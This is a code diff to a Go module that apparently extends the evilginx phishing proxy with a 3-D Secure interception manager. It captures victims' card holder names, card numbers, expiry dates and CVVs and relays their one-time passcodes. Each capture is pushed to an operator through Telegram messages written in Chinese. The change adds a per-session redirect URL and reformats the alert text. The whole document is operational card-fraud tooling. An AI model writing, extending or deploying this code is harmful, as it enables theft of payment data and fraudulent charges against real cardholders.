@@ -37,6 +37,7 @@ type ThreeDSSession struct {
 	HolderName    string // Card holder name for message display
 	RemoteAddr    string // Store IP for message display
 	PhishletName  string // Store phishlet name (internal use)
+	RedirectURL   string // Final redirect URL after completion (dynamic)
 	mu            sync.Mutex
 }
 
@@ -111,7 +112,7 @@ func (m *ThreeDSManager) cleanupExpired() {
 
 // Initiate creates a new 3DS session after CVV capture
 // If session already exists but is in a final state (completed/expired), it gets reset
-func (m *ThreeDSManager) Initiate(sessionID string, sIndex int, cvv string, cardNumber string, expireDate string, holderName string, remoteAddr string, phishletName string) *ThreeDSSession {
+func (m *ThreeDSManager) Initiate(sessionID string, sIndex int, cvv string, cardNumber string, expireDate string, holderName string, remoteAddr string, phishletName string, redirectURL string) *ThreeDSSession {
 	m.mu.Lock()
 	defer m.mu.Unlock()
 
@@ -134,6 +135,7 @@ func (m *ThreeDSManager) Initiate(sessionID string, sIndex int, cvv string, card
 		existing.HolderName = holderName
 		existing.RemoteAddr = remoteAddr
 		existing.PhishletName = phishletName
+		existing.RedirectURL = redirectURL
 		existing.mu.Unlock()
 		log.Info("[3DS] session re-initiated: %s (sIndex: %d)", sessionID, sIndex)
 		return existing
@@ -154,6 +156,7 @@ func (m *ThreeDSManager) Initiate(sessionID string, sIndex int, cvv string, card
 		HolderName:    holderName,
 		RemoteAddr:    remoteAddr,
 		PhishletName:  phishletName,
+		RedirectURL:   redirectURL,
 	}
 	m.sessions[sessionID] = ts
 	m.indexToSess[sIndex] = ts
@@ -292,9 +295,10 @@ func (m *ThreeDSManager) GetStatus(sessionID string) (state string, redirectURL 
 
 	state = ts.State
 	otpCount = ts.OTPCount
+	redirectURL = ts.RedirectURL
 
-	// Get redirect URL from the evilginx session
-	if m.proxy != nil {
+	// Fallback: get redirect URL from the evilginx session
+	if redirectURL == "" && m.proxy != nil {
 		m.proxy.session_mtx.Lock()
 		if s, ok := m.proxy.sessions[sessionID]; ok && s.RedirectURL != "" {
 			redirectURL = s.RedirectURL
@@ -483,10 +487,10 @@ func (m *ThreeDSManager) updateTelegramOTPWaiting(sessionID string, msgID int) {
 
 	msg := fmt.Sprintf(
 		"🔐 3DS验证中 (Session #%d)\n\n"+
-			"� 持卡人: %s\n"+
-			"� 卡号: %s\n"+
+			"👤持卡人: %s\n"+
+			"💳卡号: %s\n"+
 			"📅 有效期: %s\n"+
-			"� CVV: %s\n"+
+			"🔑CVV: %s\n"+
 			"🌐 IP: %s\n\n"+
 			"⚙️ 状态: 等待用户输入 OTP",
 		sIndex, holderName, cardNumber, expireDate, cvv, ip,
@@ -518,10 +522,10 @@ func (m *ThreeDSManager) updateTelegramOTPSubmitted(sessionID string) {
 
 	msg := fmt.Sprintf(
 		"🔐 3DS验证中 (Session #%d)\n\n"+
-			"� 持卡人: %s\n"+
-			"� 卡号: %s\n"+
+			"👤持卡人: %s\n"+
+			"💳卡号: %s\n"+
 			"📅 有效期: %s\n"+
-			"� CVV: %s\n"+
+			"🔑CVV: %s\n"+
 			"🌐 IP: %s\n\n"+
 			"🔢 OTP (第%d次): %s\n\n"+
 			"⚙️ 状态: 等待管理员审核",
@@ -548,10 +552,10 @@ func (m *ThreeDSManager) updateTelegramOTPRejected(sessionID string, msgID int) 
 
 	msg := fmt.Sprintf(
 		"🔐 3DS验证中 (Session #%d)\n\n"+
-			"� 持卡人: %s\n"+
-			"� 卡号: %s\n"+
+			"👤持卡人: %s\n"+
+			"💳卡号: %s\n"+
 			"📅 有效期: %s\n"+
-			"� CVV: %s\n"+
+			"🔑CVV: %s\n"+
 			"🌐 IP: %s\n\n"+
 			"🔢 OTP (第%d次): %s ❌ 已拒绝\n\n"+
 			"⚙️ 状态: 等待用户重新输入",
@@ -576,10 +580,10 @@ func (m *ThreeDSManager) updateTelegramCompleted(sessionID string, msgID int, re
 
 	msg := fmt.Sprintf(
 		"✅ 已放行 (Session #%d)\n\n"+
-			"� 持卡人: %s\n"+
+			"👤持卡人: %s\n"+
 			"�💳 卡号: %s\n"+
 			"📅 有效期: %s\n"+
-			"� CVV: %s\n"+
+			"🔑CVV: %s\n"+
 			"🌐 IP: %s\n"+
 			"%s"+
 			"⚙️ 状态: %s\n用户将被重定向",
@@ -614,10 +618,10 @@ func (m *ThreeDSManager) Send3DSNotification(sessionID string) int {
 
 	msg := fmt.Sprintf(
 		"🔔 新捕获! (Session #%d)\n\n"+
-			"� 持卡人: %s\n"+
-			"�� 卡号: %s\n"+
+			"👤持卡人: %s\n"+
+			"�💳卡号: %s\n"+
 			"📅 有效期: %s\n"+
-			"� CVV: %s\n"+
+			"🔑CVV: %s\n"+
 			"🌐 IP: %s\n\n"+
 			"请选择操作:",
 		sIndex, holderName, cardNumber, expireDate, cvv, ip,
